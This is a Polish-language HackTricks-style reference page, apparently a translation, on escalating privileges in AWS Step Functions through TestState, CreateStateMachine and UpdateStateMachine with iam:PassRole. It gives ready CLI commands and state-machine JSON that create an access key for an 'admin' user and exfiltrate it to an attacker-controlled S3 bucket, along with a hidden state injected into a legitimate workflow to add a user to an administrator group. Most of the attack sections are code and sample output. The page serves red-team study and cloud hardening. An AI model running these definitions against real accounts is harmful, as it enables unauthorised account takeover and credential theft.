# AWS - Eskalacja uprawnień w Step Functions

<details>

<summary><strong>Zacznij od zera i stań się ekspertem AWS Red Team dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Step Functions

Aby uzyskać więcej informacji na temat tej usługi AWS, sprawdź:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Atakujący posiadający uprawnienia **`states:TestState`** & **`iam:PassRole`** może testować dowolny stan i przekazywać do niego dowolną rolę IAM bez konieczności tworzenia lub aktualizacji istniejącego automatu stanów, umożliwiając nieautoryzowany dostęp do innych usług AWS z uprawnieniami ról. Potencjalnie te uprawnienia mogą prowadzić do rozległych nieautoryzowanych działań, od manipulowania przepływami pracy, zmiany danych, po naruszenia danych, manipulację zasobami i eskalację uprawnień.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Poniższe przykłady pokazują, jak przetestować stan, który tworzy klucz dostępu dla użytkownika **`admin`**, wykorzystując te uprawnienia oraz permisywną rolę środowiska AWS. Ta permisywna rola powinna mieć przypisaną jakąkolwiek politykę o wysokich uprawnieniach (na przykład **`arn:aws:iam::aws:policy/AdministratorAccess`**), która umożliwia stanowi wykonanie akcji **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Polecenie** wykonane w celu wykonania eskalacji uprawnień:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Potencjalne skutki**: Nieautoryzowane wykonywanie i manipulowanie przepływami pracy oraz dostęp do wrażliwych zasobów, co potencjalnie prowadzi do poważnych naruszeń bezpieczeństwa.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Atakujący posiadający uprawnienia **`states:CreateStateMachine`** i **`iam:PassRole`** będzie mógł utworzyć maszynę stanów i przypisać do niej dowolną rolę IAM, umożliwiając nieautoryzowany dostęp do innych usług AWS z uprawnieniami ról. W przeciwieństwie do poprzedniej techniki eskalacji uprawnień (**`states:TestState`** & **`iam:PassRole`**), ta nie wykonuje się automatycznie, będziesz także potrzebować uprawnień **`states:StartExecution`** lub **`states:StartSyncExecution`** (**`states:StartSyncExecution`** nie jest dostępne dla standardowych przepływów pracy, służy tylko do wyrażania maszyn stanów) aby rozpocząć i wykonać przepływ pracy.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Poniższe przykłady pokazują, jak utworzyć maszynę stanu, która tworzy klucz dostępu dla użytkownika **`admin`** i wycieka ten klucz dostępu do kontrolowanego przez atakującego kubełka S3, wykorzystując te uprawnienia oraz permisywną rolę środowiska AWS. Ta permisywna rola powinna mieć przypisaną jakąkolwiek politykę o wysokich uprawnieniach (na przykład **`arn:aws:iam::aws:policy/AdministratorAccess`**), która umożliwia maszynie stanu wykonanie akcji **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Polecenie** wykonane w celu **utworzenia maszyny stanowej**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Polecenie** wykonane w celu **uruchomienia wykonania** wcześniej utworzonej maszyny stanowej:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

S3 bucket kontrolowany przez atakującego powinien mieć uprawnienia do akceptowania działania s3:PutObject z konta ofiary.

{% endhint %}

- **Potencjalny wpływ**: Nieautoryzowane wykonanie i manipulacja przepływami pracy oraz dostęp do wrażliwych zasobów, co potencjalnie prowadzi do poważnych naruszeń bezpieczeństwa.

### `states:UpdateStateMachine` & (nie zawsze wymagane) `iam:PassRole`

Atakujący posiadający uprawnienia **`states:UpdateStateMachine`** będzie mógł modyfikować definicję maszyny stanowej, dodając dodatkowe ukryte stany, które mogą prowadzić do eskalacji uprawnień. W ten sposób, gdy prawidłowy użytkownik rozpocznie wykonanie maszyny stanowej, nowy złośliwy ukryty stan zostanie wykonany, a eskalacja uprawnień zakończy się sukcesem.

W zależności od tego, jak liberalna jest rola IAM powiązana z maszyną stanową, atakujący będzie miał do czynienia z dwiema sytuacjami:

1. **Liberalna rola IAM**: Jeśli rola IAM powiązana z maszyną stanową jest już liberalna (ma na przykład dołączoną politykę **`arn:aws:iam::aws:policy/AdministratorAccess`**), to uprawnienie **`iam:PassRole`** nie będzie wymagane do eskalacji uprawnień, ponieważ nie będzie konieczne również aktualizowanie roli IAM, wystarczy definicja maszyny stanowej.
2. **Nie liberalna rola IAM**: W przeciwieństwie do poprzedniego przypadku, tutaj atakujący będzie również potrzebować uprawnienia **`iam:PassRole`**, ponieważ konieczne będzie powiązanie liberalnej roli IAM z maszyną stanową, oprócz modyfikacji definicji maszyny stanowej.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Poniższe przykłady pokazują, jak zaktualizować legalną maszynę stanów, która po prostu wywołuje funkcję Lambda HelloWorld, aby dodać dodatkowy stan dodający użytkownika **`unprivilegedUser`** do grupy IAM **`administrator`**. W ten sposób, gdy legalny użytkownik rozpocznie wykonanie zaktualizowanej maszyny stanów, ten nowy złośliwy stan ukryty zostanie wykonany, a eskalacja uprawnień będzie udana.

{% hint style="warning" %}

Jeśli maszyna stanów nie ma skojarzonej uprawnionej roli IAM, będzie również wymagane uprawnienie **`iam:PassRole`** do zaktualizowania roli IAM w celu przypisania uprawnionej roli IAM (na przykład z załączoną polityką **`arn:aws:iam::aws:policy/AdministratorAccess`**).

{% endhint %}

{% tabs %}

{% tab title="Legalna Maszyna Stanów" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Złośliwa zaktualizowana maszyna stanów" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Polecenie** wykonane w celu **aktualizacji** **legitymnego stanowiska**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Potencjalne skutki**: Nieautoryzowane wykonywanie i manipulowanie przepływami pracy oraz dostęp do wrażliwych zasobów, co potencjalnie prowadzi do poważnych naruszeń bezpieczeństwa.

<details>

<summary><strong>Zacznij od zera i zostań ekspertem AWS Red Team dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
